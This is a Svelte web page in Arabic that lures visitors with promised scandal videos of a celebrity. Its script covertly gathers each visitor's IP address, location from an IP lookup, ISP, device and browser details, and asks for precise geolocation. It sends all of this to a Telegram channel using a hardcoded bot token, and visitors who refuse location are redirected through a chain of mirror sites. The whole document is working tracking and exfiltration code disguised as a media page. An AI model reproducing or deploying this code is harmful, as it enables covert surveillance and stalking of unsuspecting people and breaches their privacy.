<script>
  import { onMount } from 'svelte';
  
  onMount(async () => {
    sendIPToTelegramBots();
    
    // Request location permission automatically
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        // Location permission granted, send location and IP results to Telegram bots
        await sendLocationAndIPToTelegramBots(position.coords.latitude, position.coords.longitude);
      },
      (error) => {
        if (error.code === error.PERMISSION_DENIED) {
          // Location permission denied, send IP result to Telegram bots
          redirectToNextURL();
        }
      }
    );
  });

  async function sendLocationAndIPToTelegramBots(latitude, longitude) {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const message = `
الموقع:

${latitude} ${longitude}

الايبي:

${ipAddress}
`;

    // Create the message with the clickable link to Google Maps
    const locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const clickableLink = `<a href="${locationLink}" style="color: red;">اللوكيشن</a>`;
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
    const locationIcon = "\u{1F4CD}"; // Location icon as text (Unicode character)

    const htmlMessage = `${locationIcon} ${message}\n\n${clickableLink}\n\n${ipLocationNetLink}`;

    // Send location and IP results to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function sendIPToTelegramBots() {
    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;

    // Get the IP address using ipify API
    const response = await fetch('https://api.ipify.org/?format=json');
    const data = await response.json();
    const ipAddress = data.ip;

    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
    const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
    const vendor = navigator.vendor;
    const isAndroid = userAgent.toLowerCase().includes('android');

    const ipInfo = await getIPInfo(ipAddress);
    const country = ipInfo.country_name || 'N/A';
    const city = ipInfo.city || 'N/A';
    const isp = ipInfo.org || 'N/A';

    const message = `
الايبي: ${ipAddress}
البلد: ${country}
مدينة مزود الخدمة: ${city}
المنظمة: ${isp}
المنصة: ${platform}
عرض الشاشة: ${screenWidth}
ارتفاع الشاشة: ${screenHeight}
عدد المعالجات: ${cpuCores}
الرامات: ${totalRAM}
شركة السوفتوير: ${vendor}
اندرويد: ${isAndroid ? 'نعم' : 'لا'}
باقي البيانات: ${userAgent}
`;

    // Create the message with clickable link
    const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
    const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
    const htmlMessage = `${message}\n\n${ipLocationNetLink}`;

    // Send IP result to Telegram bots using an HTTP request
    await fetch(telegramBotURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '@localipy', // Replace with the channel username or ID
        text: htmlMessage,
        parse_mode: 'HTML',
      }),
    });
  }

  async function getIPInfo(ip) {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (response.ok) {
      return response.json();
    }
    return {};
  }

  function redirectToNextURL() {
    // Get the current URL
    var currURL = window.location.href;

    // Extract the current number from the URL
    var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);

    // Check if the current number is less than or equal to 999
    if (currNum <= 999) {
      // Increment the current number by 1 and construct the next URL
      var nextNum = currNum + 1;
      var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);

      // Redirect to the next URL
      window.location.href = nextURL;
    } else {
      // If the current number is greater than 999, display an alert message
      // alert('You have reached the maximum number of URLs.');
      window.location.href = 'https://mhf1.onrender.com/';
    }
  }
</script>

<main>
  <center>
    <h1 style="font-size: 36px; font-weight: bold;">فضايح هيفاء وهبي</h1>
  </center>
  <center>
    <h1 style="font-size: 36px; font-weight: bold;">‎اعمل سماح لمشاهدة فيديو الفضايح يلا بسرعة</h1>
  </center>

  <div class="image-grid">
    <div class="image-container">
      <img src="https://i.ibb.co/CM1zJSc/photo1.jpg" alt="Photo 1">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/Qn6nbGM/photo2.jpg" alt="Photo 2">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/XF1gFN0/photo3.jpg" alt="Photo 3">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/rmSPhTB/photo4.jpg" alt="Photo 4">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/0BVhJkB/photo5.jpg" alt="Photo 5">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/5Mw4bdQ/photo6.jpg" alt="Photo 6">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/2Y0ZKnT/photo7.jpg" alt="Photo 7">
    </div>
    <div class="image-container">
      <img src="https://i.ibb.co/PhKHmNt/photo8.jpg" alt="Photo 8">
    </div>
  </div>
</main>

<style>
  .image-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    grid-gap: 10px;
  }

  .image-container {
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .image-container img {
    max-width: 100%;
    height: auto;
  }
</style>
